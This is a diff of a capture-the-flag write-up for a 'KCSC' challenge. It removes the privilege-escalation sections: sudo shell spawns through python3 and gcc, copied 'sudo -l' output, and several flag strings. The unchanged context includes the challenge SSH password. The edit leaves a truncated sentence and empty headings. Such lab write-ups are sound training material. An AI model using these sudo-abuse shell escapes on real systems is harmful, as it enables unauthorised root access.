@@ -18,7 +18,7 @@ https://www.facebook.com/photo?fbid=122765970560556&set=a.120329284137558
   - [flag2.txt](#flag2txt)
   - [flag9.txt](#flag9txt)
   - [flag10.txt](#flag10txt)
-  - [flag5_6.png (hardcore version)](#flag5_6png-hardcore-version)
+  - [flag5.txt hardcore version](#flag5txt-hardcore-version)
   
 ## Information Gathering
 - Connect: `ssh user@chall.kcsc.cf -p XXXXX`, password SSH: `kcsc@123`
@@ -102,41 +102,12 @@ Searching on [gtfobin](https://gtfobins.github.io), we see that `env` binary can
 ### flag7.txt
 Now, we can simply `cat flag7.txt` to get the flag: `KCSC{part_7_wow_u_r_quite_gud}`
 ## Privilege Escalation - `admin`
-The only user left before getting `root` is `admin`. Checking `sudo -l` for any exploitable vulnerabilities:
-```
-mod@kcsc:~$ sudo -l
-Matching Defaults entries for mod on kcsc:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User mod may run the following commands on kcsc:
-    (admin) NOPASSWD: /usr/bin/python3
-```
-The `python3` binary can also be used for privilege escalation, so we spawn a shell with `admin` privilege using this binary: `sudo -u admin python3 -c 'import os; os.system("/bin/sh")'`.
+The only user left 
 ## Flags Discovering - Part 3
 ### flag8.txt
-Now, we can simply `cat flag8.txt` to get the flag: `KCSC{part8_hmm_u_know_env_sh}`
 ## Privilege Escalation - `root`
-Final target! Checking `sudo -l` for any exploitable vulnerabilities:
-```
-$ sudo -l
-Matching Defaults entries for admin on kcsc:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User admin may run the following commands on kcsc:
-    (ALL) ALL
-    (root) NOPASSWD: /usr/bin/gcc
-```
-Again, `gcc` can be used to spawn a shell with `root` privilege: `sudo -u root gcc -wrapper /bin/sh,-s .`.
 ## Flags Discovering - Part 4
 ### flag2.txt
-At the `/home/user` folder, this file along with `flag9.txt` is `root` only. Now, as we become `root`, we can `cat flag2.txt` to get the flag: `KCSC{part_2_hello_pls_not_get_root}`
 ### flag9.txt
-Like `flag2.txt`, `cat flag9.txt` give us the flag: `KCSC{part_9_r_u_vim_lord??}`
 ### flag10.txt
-Using `find` command to find this file: `find / -name flag10.txt 2>/dev/null`, we found this file at `/` directory. `cat flag10.txt` give us the final flag: `KCSC{part_10_tuong_vy_la_con_nao_the???}`
-### flag5_6.png (hardcore version)
-As I mention before, we can still get this flag when become `root` without using `scp`. [chafa](https://hpjansson.org/chafa/) is a tool that allow us to see the content of image file directly on the terminal. Install this tool and see the image, we can still get the same flag as the `scp` way:
-```
-sudo apt-get install chafa
-chafa flag5_6.png
-```
+### flag5.txt hardcore version
